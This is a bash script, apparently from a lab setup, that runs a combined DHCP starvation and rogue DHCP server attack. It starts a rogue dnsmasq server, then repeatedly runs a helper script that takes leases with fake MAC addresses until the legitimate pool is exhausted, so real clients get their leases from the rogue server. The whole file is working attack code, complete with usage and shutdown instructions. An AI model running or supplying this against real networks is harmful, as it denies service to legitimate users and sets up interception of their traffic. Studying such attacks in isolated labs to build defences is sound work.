#!/usr/bin/env bash
# Combined DHCP starvation + rogue DHCP server attack.
#
# Phase 1: Exhaust legitimate DHCP pool (10.10.20.150-200) with fake MACs.
#          Loop continuously — re-grabs leases as they expire so pool
#          stays full and legitimate server can never serve real clients.
#
# Phase 2: Rogue dnsmasq runs in parallel on pool 10.10.20.210-220.
#          When a real client sends DHCPDISCOVER, legit server has no
#          IPs to offer → rogue server wins, client gets rogue lease.
#
# Run on client2 (or any client-net VM):
#   sudo bash dhcp_attack_combined.sh
#
# Stop: Ctrl+C (kills both background processes via trap)

set -uo pipefail

IFACE="${IFACE:-enp1s0}"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
EXHAUST_SCRIPT="$SCRIPT_DIR/dhcp_exhaustion.py"

if [[ $EUID -ne 0 ]]; then
    echo "[ERROR] Run as root."
    exit 1
fi

[[ -f "$EXHAUST_SCRIPT" ]] || { echo "[ERROR] dhcp_exhaustion.py not found in $SCRIPT_DIR"; exit 1; }

# Cleanup on exit — kill both background jobs
cleanup() {
    echo ""
    echo "[*] Stopping attack..."
    kill "$EXHAUST_PID" 2>/dev/null || true
    pkill dnsmasq 2>/dev/null || true
    echo "[*] Done."
}
trap cleanup INT TERM EXIT

# --- Phase 1: Start rogue DHCP first (needs to be listening before pool exhausted) ---
echo "[*] Starting rogue DHCP server (dnsmasq)..."
bash "$SCRIPT_DIR/rogue_dhcp_server.sh" &
ROGUE_PID=$!
sleep 2   # let dnsmasq fully start before exhaustion begins

# --- Phase 2: Continuous exhaustion loop in background ---
echo "[*] Starting DHCP pool exhaustion loop on $IFACE..."
(
    while true; do
        echo "[exhaust] Running exhaustion pass..."
        python3 "$EXHAUST_SCRIPT" --iface "$IFACE" --timeout 3 --max 60
        # No sleep — restart immediately. Any released lease is a window for the legit
        # server to respond. 3s OFFER timeout per attempt provides natural pacing.
        echo "[exhaust] Pool dry — restarting immediately to grab any freed leases..."
    done
) &
EXHAUST_PID=$!

echo ""
echo "[*] Attack running. Legit pool starved. Rogue DHCP serving 10.10.20.210-220."
echo "[*] Press Ctrl+C to stop."
echo ""

# Wait — keep script alive, let trap handle cleanup
wait
